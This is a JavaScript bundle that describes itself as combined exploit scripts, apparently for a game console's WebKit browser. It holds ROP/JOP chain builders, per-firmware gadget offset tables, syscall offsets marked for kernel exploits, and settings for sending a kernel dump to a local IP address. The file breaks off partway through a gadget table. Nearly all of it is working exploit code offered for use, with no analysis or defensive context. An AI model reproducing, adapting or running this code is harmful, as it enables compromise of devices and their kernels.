// bundle_devkit.js - Combined exploit scripts (DEVKIT build)
// Auto-generated bundle of all exploit modules


//================================================================================================
// Common Utilities
//================================================================================================

// ==================== RELIABILITY HELPERS ====================
function forceGC(count = 8) {
    for (let i = 0; i < count; i++) {
        new ArrayBuffer(0x800000); // ~8MB pressure
    }
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function runWithRetry(fn, maxAttempts = 6, delay = 900) {
    for (let i = 1; i <= maxAttempts; i++) {
        try {
            console.log(`[%cAttempt ${i}/${maxAttempts}%c] Running ${fn.name || 'stage'}...`, "color:cyan", "color:default");
            forceGC(6);
            await fn();
            console.log(`%cStage ${fn.name || ''} succeeded!`, "color:lime;font-weight:bold");
            return true;
        } catch (e) {
            console.error(`Attempt ${i} failed:`, e.message || e);
            if (i < maxAttempts) await sleep(delay);
        }
    }
    console.error("All attempts failed.");
    return false;
}

function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < 8; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
};

var _dview;

function u2d(low, hi) {
    if (!_dview)
		_dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low)
            new_hi++;

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low)
            new_hi++;

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF)
            new_hi--;

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF)
            new_hi--;

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    this.toPacked = function () {
        return {
            hi: this.hi,
            low: this.low
        };
    }

    this.setPacked = function (pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0)
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;

    return number + ""; // always return a string
}

var nogc = [];

failed = false

var fail = function () {
    alert.apply(null, arguments);
    throw "fail";
}

    
function sleep(milliseconds) {
	var start = new Date().getTime();
	for (var i = 0; i < 1e7; i++) {
		if ((new Date().getTime() - start) > milliseconds)
			break;
	}
}

//================================================================================================
// Syscalls
//================================================================================================
window.syscalls = {};

/* These are the offsets in libkernel for system call wrappers */
window.syscallMap =
{
  '3.55':
  {
    3: 0xAB20, // sys_read
    4: 0xAB40, // sys_write
    5: 0xAB60, // sys_open
    6: 0xAB80, // sys_close
    20: 0xACE0, // sys_getpid
    23: 0xAD40, // sys_setuid
    24: 0xAD60, // sys_getuid
    50: 0xDA10, // sys_setlogin
    54: 0xB0A0, // sys_ioctl
    73: 0xB1E0, // sys_munmap
    74: 0xB200, // sys_mprotect
    97: 0xB3E0, // sys_socket
    98: 0xB400, // sys_connect
    203: 0xB900, // sys_mlock
    324: 0xB920, // sys_mlockall
    362: 0xBF40, // sys_kqueue
    363: 0xBF60, // sys_kevent
    477: 0xB1C0, // sys_mmap
    557: 0xCB80, // Kernel Exploit Free P1 "sys_namedobj_create"
    558: 0xCBA0, // Kernel Exploit Free P3 "sys_namedobj_delete"
	591: 0xCF80, // sys_dynlib_dlsym
    594: 0xCFE0, // sys_dynlib_load_prx
    601: 0xD0C0, // Kernel Exploit Free P2 "sys_mdbg_service"
    632: 0xD4A0, // Kernel Exploit Leak P1 "sys_thr_suspend_ucontext"
    633: 0xD4C0, // Kernel Exploit Leak P3 "sys_thr_resume_ucontext"
    634: 0xD4E0, // Kernel Exploit Leak P2 "sys_thr_get_ucontext"
  },
  '4.05':
  {
    3: 0x25F0, // sys_read
    4: 0x2730, // sys_write
    5: 0x2570, // sys_open
    6: 0x24D0, // sys_close
    20: 0x06F0, // sys_getpid
    23: 0x0710, // sys_setuid
    24: 0x0730, // sys_getuid
    50: 0x0640, // sys_setlogin
    54: 0x0970, // sys_ioctl
    73: 0x09F0, // sys_munmap
    74: 0x0A10, // sys_mprotect
    97: 0x0B70, // sys_socket
    98: 0x24F0, // sys_connect
    203: 0x1030, // sys_mlock
    324: 0x1230, // sys_mlockall
    362: 0x1390, // sys_kqueue
    363: 0x13B0, // sys_kevent
    477: 0x27B0, // sys_mmap
    557: 0x1AF0, // Kernel Exploit Free P1 "sys_namedobj_create"
    558: 0x1B10, // Kernel Exploit Free P3 "sys_namedobj_delete"
	591: 0x1D50, // sys_dynlib_dlsym
    594: 0x1DB0, // sys_dynlib_load_prx
    601: 0x1E70, // Kernel Exploit Free P2 "sys_mdbg_service"
    632: 0x21D0, // Kernel Exploit Leak P1 "sys_thr_suspend_ucontext"
    633: 0x21F0, // Kernel Exploit Leak P3 "sys_thr_resume_ucontext"
    634: 0x2210, // Kernel Exploit Leak P2 "sys_thr_get_ucontext"
  }
}

/* A long ass map of system call names -> number, you shouldn't need to touch this */
window.syscallnames =
{
  "sys_exit": 1,
  "sys_fork": 2,
  "sys_read": 3,
  "sys_write": 4,
  "sys_open": 5,
  "sys_close": 6,
  "sys_wait4": 7,
  "sys_creat": 8,
  "sys_link": 9,
  "sys_unlink": 10,
  "sys_execv": 11,
  "sys_chdir": 12,
  "sys_fchdir": 13,
  "sys_mknod": 14,
  "sys_chmod": 15,
  "sys_getpid": 20,
  "sys_setuid": 23,
  "sys_getuid": 24,
  "sys_geteuid": 25,
  "sys_recvmsg": 27,
  "sys_sendmsg": 28,
  "sys_recvfrom": 29,
  "sys_accept": 30,
  "sys_getpeername": 31,
  "sys_getsockname": 32,
  "sys_access": 33,
  "sys_chflags": 34,
  "sys_fchflags": 35,
  "sys_sync": 36,
  "sys_kill": 37,
  "sys_stat": 38,
  "sys_getppid": 39,
  "sys_lstat": 40,
  "sys_dup": 41,
  "sys_pipe": 42,
  "sys_getegid": 43,
  "sys_profil": 44,
  "sys_getgid": 47,
  "sys_getlogin": 49,
  "sys_setlogin": 50,
  "sys_sigaltstack": 53,
  "sys_ioctl": 54,
  "sys_reboot": 55,
  "sys_revoke": 56,
  "sys_execve": 59,
  "sys_msync": 65,
  "sys_munmap": 73,
  "sys_mprotect": 74,
  "sys_madvise": 75,
  "sys_mincore": 78,
  "sys_getgroups": 79,
  "sys_setgroups": 80,
  "sys_setitimer": 83,
  "sys_getitimer": 86,
  "sys_getdtablesize": 89,
  "sys_dup2": 90,
  "sys_fcntl": 92,
  "sys_select": 93,
  "sys_fsync": 95,
  "sys_setpriority": 96,
  "sys_socket": 97,
  "sys_connect": 98,
  /*"sys_getpriority": 100,
  "sys_send": 101,
  "sys_recv": 102,
  "sys_bind": 104,
  "sys_setsockopt": 105,
  "sys_listen": 106,
  "sys_recvmsg": 113,
  "sys_sendmsg": 114,
  "sys_gettimeofday": 116,
  "sys_getrusage": 117,
  "sys_getsockopt": 118,
  "sys_readv": 120,
  "sys_writev": 121,
  "sys_settimeofday": 122,
  "sys_fchmod": 124,
  "sys_recvfrom": 125,
  "sys_setreuid": 126,
  "sys_setregid": 127,
  "sys_rename": 128,
  "sys_flock": 131,
  "sys_sendto": 133,
  "sys_shutdown": 134,
  "sys_socketpair": 135,
  "sys_mkdir": 136,
  "sys_rmdir": 137,
  "sys_utimes": 138,
  "sys_adjtime": 140,
  "sys_getpeername": 141,
  "sys_setsid": 147,
  "sys_sysarch": 165,
  "sys_setegid": 182,
  "sys_seteuid": 183,
  "sys_fstat": 189,
  "sys_lstat": 190,
  "sys_pathconf": 191,
  "sys_fpathconf": 192,
  "sys_getrlimit": 194,
  "sys_setrlimit": 195,
  "sys_getdirentries": 196,*/
  "sys___sysctl": 202,
  "sys_mlock": 203,
  "sys_munlock": 204,
  "sys_futimes": 206,
  "sys_poll": 209,
  "sys_clock_gettime": 232,
  "sys_clock_settime": 233,
  "sys_clock_getres": 234,
  "sys_ktimer_create": 235,
  "sys_ktimer_delete": 236,
  "sys_ktimer_settime": 237,
  "sys_ktimer_gettime": 238,
  "sys_ktimer_getoverrun": 239,
  "sys_nanosleep": 240,
  "sys_rfork": 251,
  "sys_issetugid": 253,
  "sys_getdents": 272,
  "sys_preadv": 289,
  "sys_pwritev": 290,
  "sys_getsid": 310,
  "sys_aio_suspend": 315,
  "sys_mlockall": 324,
  "sys_munlockall": 325,
  "sys_sched_setparam": 327,
  "sys_sched_getparam": 328,
  "sys_sched_setscheduler": 329,
  "sys_sched_getscheduler": 330,
  "sys_sched_yield": 331,
  "sys_sched_get_priority_max": 332,
  "sys_sched_get_priority_min": 333,
  "sys_sched_rr_get_interval": 334,
  "sys_utrace": 335,
  "sys_sigprocmask": 340,
  "sys_sigprocmask": 340,
  "sys_sigsuspend": 341,
  "sys_sigpending": 343,
  "sys_sigtimedwait": 345,
  "sys_sigwaitinfo": 346,
  "sys_kqueue": 362,
  "sys_kevent": 363,
  "sys_uuidgen": 392,
  "sys_sendfile": 393,
  "sys_fstatfs": 397,
  "sys_ksem_close": 400,
  "sys_ksem_post": 401,
  "sys_ksem_wait": 402,
  "sys_ksem_trywait": 403,
  "sys_ksem_init": 404,
  "sys_ksem_open": 405,
  "sys_ksem_unlink": 406,
  "sys_ksem_getvalue": 407,
  "sys_ksem_destroy": 408,
  "sys_sigaction": 416,
  "sys_sigreturn": 417,
  "sys_getcontext": 421,
  "sys_setcontext": 422,
  "sys_swapcontext": 423,
  "sys_sigwait": 429,
  "sys_thr_create": 430,
  "sys_thr_exit": 431,
  "sys_thr_self": 432,
  "sys_thr_kill": 433,
  "sys_ksem_timedwait": 441,
  "sys_thr_suspend": 442,
  "sys_thr_wake": 443,
  "sys_kldunloadf": 444,
  "sys__umtx_op": 454,
  "sys_thr_new": 455,
  "sys_sigqueue": 456,
  "sys_thr_set_name": 464,
  "sys_rtprio_thread": 466,
  "sys_pread": 475,
  "sys_pwrite": 476,
  "sys_mmap": 477,
  "sys_lseek": 478,
  "sys_truncate": 479,
  "sys_ftruncate": 480,
  "sys_thr_kill2": 481,
  "sys_shm_open": 482,
  "sys_shm_unlink": 483,
  "sys_cpuset_getid": 486,
  "sys_cpuset_getaffinity": 487,
  "sys_cpuset_setaffinity": 488,
  "sys_openat": 499,
  "sys_pselect": 522,

  "sys_regmgr_call": 532,
  "sys_jitshm_create": 533,
  "sys_jitshm_alias": 534,
  "sys_dl_get_list": 535,
  "sys_dl_get_info": 536,
  "sys_dl_notify_event": 537,
  "sys_evf_create": 538,
  "sys_evf_delete": 539,
  "sys_evf_open": 540,
  "sys_evf_close": 541,
  "sys_evf_wait": 542,
  "sys_evf_trywait": 543,
  "sys_evf_set": 544,
  "sys_evf_clear": 545,
  "sys_evf_cancel": 546,
  "sys_query_memory_protection": 547,
  "sys_batch_map": 548,
  "sys_osem_create": 549,
  "sys_osem_delete": 550,
  "sys_osem_open": 551,
  "sys_osem_close": 552,
  "sys_osem_wait": 553,
  "sys_osem_trywait": 554,
  "sys_osem_post": 555,
  "sys_osem_cancel": 556,
  "sys_namedobj_create": 557,
  "sys_namedobj_delete": 558,
  "sys_set_vm_container": 559,
  "sys_debug_init": 560,
  "sys_suspend_process": 561,
  "sys_resume_process": 562,
  "sys_opmc_enable": 563,
  "sys_opmc_disable": 564,
  "sys_opmc_set_ctl": 565,
  "sys_opmc_set_ctr": 566,
  "sys_opmc_get_ctr": 567,
  "sys_budget_create": 568,
  "sys_budget_delete": 569,
  "sys_budget_get": 570,
  "sys_budget_set": 571,
  "sys_virtual_query": 572,
  "sys_mdbg_call": 573,
  "sys_sblock_create": 574,
  "sys_sblock_delete": 575,
  "sys_sblock_enter": 576,
  "sys_sblock_exit": 577,
  "sys_sblock_xenter": 578,
  "sys_sblock_xexit": 579,
  "sys_eport_create": 580,
  "sys_eport_delete": 581,
  "sys_eport_trigger": 582,
  "sys_eport_open": 583,
  "sys_eport_close": 584,
  "sys_is_in_sandbox": 585,
  "sys_dmem_container": 586,
  "sys_get_authinfo": 587,
  "sys_mname": 588,
  "sys_dynlib_dlopen": 589,
  "sys_dynlib_dlclose": 590,
  "sys_dynlib_dlsym": 591,
  "sys_dynlib_get_list": 592,
  "sys_dynlib_get_info": 593,
  "sys_dynlib_load_prx": 594,
  "sys_dynlib_unload_prx": 595,
  "sys_dynlib_do_copy_relocations": 596,
  "sys_dynlib_prepare_dlclose": 597,
  "sys_dynlib_get_proc_param": 598,
  "sys_dynlib_process_needed_and_relocate": 599,
  "sys_sandbox_path": 600,
  "sys_mdbg_service": 601,
  "sys_randomized_path": 602,
  "sys_rdup": 603,
  "sys_dl_get_metadata": 604,
  "sys_workaround8849": 605,
  "sys_is_development_mode": 606,
  "sys_get_self_auth_info": 607,
  "sys_dynlib_get_info_ex": 608,
  "sys_budget_getid": 609,
  "sys_budget_get_ptype": 610,
  "sys_get_paging_stats_of_all_threads": 611,
  "sys_get_proc_type_info": 612,
  "sys_get_resident_count": 613,
  "sys_prepare_to_suspend_process": 614,
  "sys_get_resident_fmem_count": 615,
  "sys_thr_get_name": 616,
  "sys_set_gpo": 617,
  "sys_get_paging_stats_of_all_objects": 618,
  "sys_test_debug_rwmem": 619,
  "sys_free_stack": 620,
  "sys_suspend_system": 621,
  "sys_ipmimgr_call": 622,
  "sys_get_gpo": 623,
  "sys_get_vm_map_timestamp": 624,
  "sys_opmc_set_hw": 625,
  "sys_opmc_get_hw": 626,
  "sys_get_cpu_usage_all": 627,
  "sys_mmap_dmem": 628,
  "sys_physhm_open": 629,
  "sys_physhm_unlink": 630,
  "sys_resume_internal_hdd": 631,
  "sys_thr_suspend_ucontext": 632,
  "sys_thr_resume_ucontext": 633,
  "sys_thr_get_ucontext": 634,
  /*"sys_thr_set_ucontext": 635,
  "sys_set_timezone_info": 636,
  "sys_set_phys_fmem_limit": 637,
  "sys_utc_to_localtime": 638,
  "sys_localtime_to_utc": 639,
  "sys_set_uevt": 640,
  "sys_get_cpu_usage_proc": 641,
  "sys_get_map_statistics": 642,
  "sys_set_chicken_switches": 643,
  "sys_extend_page_table_pool": 644,
  "sys_645": 645,
  "sys_get_kernel_mem_statistics": 646,
  "sys_get_sdk_compiled_version": 647,
  "sys_app_state_change": 648,
  "sys_dynlib_get_obj_member": 649,
  "sys_budget_get_ptype_of_budget": 650,
  "sys_prepare_to_resume_process": 651,
  "sys_process_terminate": 652,
  "sys_blockpool_open": 653,
  "sys_blockpool_map": 654,
  "sys_blockpool_unmap": 655,
  "sys_dynlib_get_info_for_libdbg": 656,
  "sys_blockpool_batch": 657,
  "sys_fdatasync": 658,
  "sys_dynlib_get_list2": 659,
  "sys_dynlib_get_info2": 660,
  "sys_aio_submit": 661,
  "sys_aio_multi_delete": 662,
  "sys_aio_multi_wait": 663,
  "sys_aio_multi_poll": 664,
  "sys_aio_get_data": 655,
  "sys_aio_multi_cancel": 666,
  "sys_get_bio_usage_all": 667,
  "sys_aio_create": 668,
  "sys_aio_submit_cmd": 669,
  "sys_aio_init": 670,
  "sys_get_page_table_stats": 671,
  "sys_dynlib_get_list_for_libdbg": 672*/
}


/* Get syscall name by index */
function swapkeyval(json) {
  var ret = {};
  for (var key in json) {
    if (json.hasOwnProperty(key))
      ret[json[key]] = key;
  }
  return ret;
}
window.nameforsyscall = swapkeyval(window.syscallnames);

//================================================================================================
// ROP Chain
//================================================================================================
window.memory = function (address) {
  this.basePtr = address;
  this.dataPtr = 0;

  /* Return a pointer in mmap'd memory */
  this.allocate = function(size) {
    /* Prevent buffer overflow / pagefault */
    if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000)
      return -1;

    var memAddr = this.basePtr.add32(this.dataPtr);

    this.dataPtr += size;

    return memAddr;
  };

  /* Clears all data by zeroing out this.data and resetting count */
  this.clear = function() {
    for (var i = 0; i < 0x10000; i += 8)
      p.write8(this.basePtr.add32(i), 0);
  };

  /* Zero out our data buffer before returning a storage object */
  this.clear();

  return this;
};

// Class for quickly creating a kernel ROP chain
window.kropchain = function (addr) {
  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
  this.stackBase = addr;
  this.count = 0;

  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.count * 8), val);
    this.count++;
  };

  // Write to address with value (helper function)
  this.write64 = function (address, value) {
    this.push(gadgets["pop rdi"]);
    this.push(address);
    this.push(gadgets["pop rax"]);
    this.push(value);
    this.push(gadgets["mov [rdi], rax"]);
  };

  // Return kropchain object
  return this;
};

// Class for quickly creating and managing a ROP chain
window.rop = function() {
  this.stack = new Uint32Array(0x4000); // 0x4000
  this.stackBase = p.read8(p.leakval(this.stack).add32(window.leakval_slide));
  this.count = 0;

  this.clear = function() {
    this.count = 0;
    this.runtime = undefined;

    for (var i = 0; i < 0xFF0 / 2; i++)
		p.write8(this.stackBase.add32(i * 8), 0);
  };

  this.pushSymbolic = function() {
    this.count++;
    return this.count-1;
  };

  this.finalizeSymbolic = function(idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  };

  this.push = function(val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  };

  this.push_write8 = function(where, what) {
      this.push(gadgets["pop rdi"]);
      this.push(where);
      this.push(gadgets["pop rsi"]);
      this.push(what);
      this.push(gadgets["mov [rdi], rsi"]);
  };

  this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }
    
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  };
  
  /* Sets up a return value location */
  this.saveReturnValue = function(where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  };
  
  this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      //var retv = p.loadchain(this);
      this.clear();
      return retv;
  };
  
  return this;
};

//================================================================================================
// Userland (devkit=true)
//================================================================================================
var p;
var socket_ip_pc = '192.168.2.79';
var socket_port_send = 9023;
var dump_kernel = 0;
var dump_kernel_with_patches = 1;
var devkit = true;
var bin_loader = false;

function sleep(milliseconds) {
	var start = new Date().getTime();
	for (var i = 0; i < 1e7; i++) {
		if ((new Date().getTime() - start) > milliseconds)
			break;
	}
}

var print = function (x) {
	document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
	document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
	var z = p.read4(addr) & 0xFFFF;
	var y = p.read4(addr.add32(2));
	if (z != 0x25ff)
		return 0;
	return addr.add32(y + 6);
}

window.stage2_old = function () {
	try {
		stage2_();
	} catch (e) {
		//alert(e);
	}
}

// ====================== STAGE 2 HANDLER (Async Safe) ======================
window.stage2 = async function stage2() {
    console.log("[Stage2] Starting...");

    try {
        if (typeof stage2_ === "function") {
            await stage2_();           // Properly await the async function
            console.log("[Stage2] Completed successfully");
        } else {
            console.error("[Stage2] stage2_() function not found!");
        }
    } catch (e) {
        console.error("[Stage2] Error:", e);
        // alert(e); // Uncomment only for debugging
    }
};

var gadgetmap_wk = {
	"ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
	"pop rsi": [0x5e, 0xc3],
	"pop rdi": [0x5f, 0xc3],
	"pop rsp": [0x5c, 0xc3],
	"pop rax": [0x58, 0xc3],
	"pop rdx": [0x5a, 0xc3],
	"pop rcx": [0x59, 0xc3],
	"pop rbp": [0x5d, 0xc3],
	"pop r8": [0x47, 0x58, 0xc3],
	"pop r9": [0x47, 0x59, 0xc3],
	"infloop": [0xeb, 0xfe, 0xc3],
	"ret": [0xc3],
	"mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
	"mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
	"mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;
var gadgetcache;
var gadgetshiftcache;

/* Get user agent for determining system firmware */
var fwFromUA = navigator.userAgent.substring(navigator.userAgent.indexOf("5.0 (") + 19, navigator.userAgent.indexOf(") Apple"));
if (fwFromUA == "5.03") window.log(fwFromUA + " is not supported yet", "red");

if (fwFromUA == "3.55") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x00000062, // 3.55
		"jmp rax":                0x00000092, // 3.55
		"ep":                     0x000000BD, // 3.55
		"pop rbp":                0x000000C6, // 3.55
		"mov [rdi], rax":         0x0011FC37, // 3.55
		"pop r8":                 0x004C13BD, // 3.55
		"pop rax":                0x0001C6AB, // 3.55
		"mov rax, rdi":           0x000057C3, // 3.55
		"mov rax, [rax]":         0x0004ADD2, // 3.55
		"pop rsi":                0x000B9EBB, // 3.55
		"pop rdi":                0x00113991, // 3.55
		"pop rcx":                0x003CA71B, // 3.55
		"pop rsp":                0x00376850, // 3.55
		"mov [rdi], rsi":         0x004584D0, // 3.55
		"pop rdx":                0x00001AFA, // 3.55
		"pop r9":                 0x00EE0A8F, // 3.55
		"jop":                    0x0086D4F4, // 3.55 SPECIAL
		"infloop":                0x00057F2F, // 3.55
		
		// kROP gadgets
		"mov [rdx], rax":         0x005DC43D, // 3.55
		"add rax, rcx":           0x000879D7, // 3.55
		"mov rdx, rax":           0x0000B45C, // 3.55
		"mov rax, rdx":           0x002E19F1, // 3.55
		"jmp rdx":                0x0002A4B2, // 3.55
		
		// namedobj kexploit
		"push rax; jmp rcx":      0x004854B0, // 3.55
		
		// BPF race kexploit
		"leave":                  0x0000AE00, // 3.55
		
		// BPF race old kexploit
		"leave_1":                0x00003E8A, // 3.55

		// BPF double free kexploit
		"ret2userland":           0x0000FC7A, // 3.55
		"add rsp, 0x28":          0x00006AF2, // 3.55
		"mov rax, [rdi]":         0x000A0450, // 3.55
		"mov [rsi], rdx":         0x011EC433, // 3.55
		"add rdi, rax; mov rax, rdi":0x012B48D8, // 3.55
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x001AC260, // 3.55
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x0061A86D, // 3.55 SPECIAL
		"jop2":                   0x00886461, // 3.55
		"jop3":                   0x01120BAB, // 3.55
		"jop4":                   0x0086D4F0, // 3.55 SPECIAL
		"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
		"jop6":                   0x005CB98D, // 3.55 SPECIAL
		
		// Functions
		"longjmp":                0x00000D98, // 3.55
		"createThread":           0x002D1CB0, // 3.55
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000018, // 3.55-4.05
		"stackshift_jop6":        0x00000028, // 3.55-5.05
		"jump_shift_jop1":        0x000003C0, // 3.55-4.05
		"jump_shift_jop5":        0x00000410, // 3.55-4.05
		"jump_shift_jop6":        0x00000358, // 3.55-4.05
	};
} else if (fwFromUA == "4.05") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x000000C8, // 4.05
		"jmp rax":                0x00000093, // 4.05
		"ep":                     0x000000BE, // 4.05
		"pop rbp":                0x000000C7, // 4.05
		"mov [rdi], rax":         0x0011ADD7, // 4.05
		"pop r8":                 0x004A3B0D, // 4.05
		"pop rax":                0x0001D70B, // 4.05
		"mov rax, rdi":           0x00005863, // 4.05
		"mov rax, [rax]":         0x000FD88D, // 4.05
		"pop rsi":                0x000A459E, // 4.05
		"pop rdi":                0x0010F1C1, // 4.05
		"pop rcx":                0x001FCA9B, // 4.05
		"pop rsp":                0x0020AEB0, // 4.05
		"mov [rdi], rsi":         0x0043CF70, // 4.05
		"pop rdx":                0x000D6660, // 4.05
		"pop r9":                 0x00EB5F8F, // 4.05
		"jop":                    0x00852624, // 4.05 SPECIAL
		"infloop":                0x00B29049, // 4.05
		
		// kROP gadgets
		"mov [rdx], rax":         0x005BB74D, // 4.05
		"add rax, rcx":           0x00086F06, // 4.05
		"mov rdx, rax":           0x0000B44A, // 4.05
		"mov rax, rdx":           0x000DAB96, // 4.05
		"jmp rdx":                0x0027A198, // 4.05
		
		// namedobj kexploit
		"push rax; jmp rcx":      0x00469B80, // 4.05
		
		// BPF race kexploit
		"leave":                  0x001B7D63, // 4.05

		// BPF race old kexploit
		"leave_1":                0x00003F1A, // 4.05
		
		// BPF double free kexploit
		"ret2userland":           0x0000FC0A, // 4.05
		"add rsp, 0x28":          0x00006B72, // 4.05
		"mov rax, [rdi]":         0x0009E490, // 4.05
		"mov [rsi], rdx":         0x011C1703, // 4.05
		"add rdi, rax; mov rax, rdi":0x01289BA8, // 4.05
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x001A7B90, // 4.05
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x005FA63D, // 4.05 SPECIAL
		"jop2":                   0x0086BAC1, // 4.05
		"jop3":                   0x010F5E7B, // 4.05
		"jop4":                   0x00852620, // 4.05 SPECIAL
		"jop_mov rbp, rsp":       0x002F88E4, // 4.05 SPECIAL
		"jop6":                   0x005AAD1D, // 4.05 SPECIAL
		
		// Functions
		"longjmp":                0x00000DE0, // 4.05
		"createThread":           0x002C48C0, // 4.05
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000018, // 4.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000003C0, // 4.05
		"jump_shift_jop5":        0x00000410, // 4.05
		"jump_shift_jop6":        0x00000358, // 4.05
	};
} else if (fwFromUA == "4.55" || fwFromUA == "4.74") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x00003FBA, // 4.55-4.74
		"pop r8":                 0x0000CC42, // 4.55-4.74
		"pop rax":                0x0000CC43, // 4.55-4.74
		"mov rax, rdi":           0x0000E84E, // 4.55-4.74
		"mov rax, [rax]":         0x000130A3, // 4.55-4.74
		"pop rsi":                0x0007B1EE, // 4.55-4.74
		"pop rdi":                0x0007B23D, // 4.55-4.74
		"pop rcx":                0x00271DE3, // 4.55-4.74
		"pop rsp":                0x0027A450, // 4.55-4.74
		"mov [rdi], rsi":         0x0039CF70, // 4.55-4.74
		"pop rdx":                0x00565838, // 4.55-4.74
		"pop r9":                 0x0078BA1F, // 4.55-4.74
		"jop":                    0x01277350, // 4.55-4.74
		"infloop":                0x012C4009, // 4.55-4.74

		// kROP gadgets
		"mov [rdx], rax":         0x009B5BE3, // 4.55-4.74
		"add rax, rcx":           0x0084D04D, // 4.55-4.74
		"mov rdx, rax":           0x00012A16, // 4.55-4.74
		"mov rax, rdx":           0x001E4EDE, // 4.55-4.74
		"jmp rdx":                0x001517C7, // 4.55-4.74

		// BPF race kexploit
		"leave":                  0x0003EBD0, // 4.55-4.74
		
		// BPF double free kexploit
		"ret2userland":           0x0008905C, // 4.55-4.74
		"add rsp, 0x28":          0x000028A2, // 4.55-4.74
		"mov rax, [rdi]":         0x0013A220, // 4.55-4.74
		"mov [rsi], rdx":         0x01574006, // 4.55-4.74
		"add rdi, rax; mov rax, rdi":0x0141D1CD, // 4.55-4.74
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x00018C10, // 4.55-4.74
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x005D365D, // 4.55-4.74
		"jop2":                   0x007B0E65, // 4.55-4.74
		"jop3":                   0x0142BDBB, // 4.55-4.74
		"jop4":                   0x00637AC4, // 4.55-4.74
		"jop_mov rbp, rsp":       0x001B5B7A, // 4.55-4.74
		"jop6":                   0x000F391D, // 4.55-4.74
		
		// Functions
		"longjmp":                0x00001458, // 4.55-4.74
		"createThread":           0x0116ED40, // 4.55-4.74
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000048, // 4.55-4.74
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
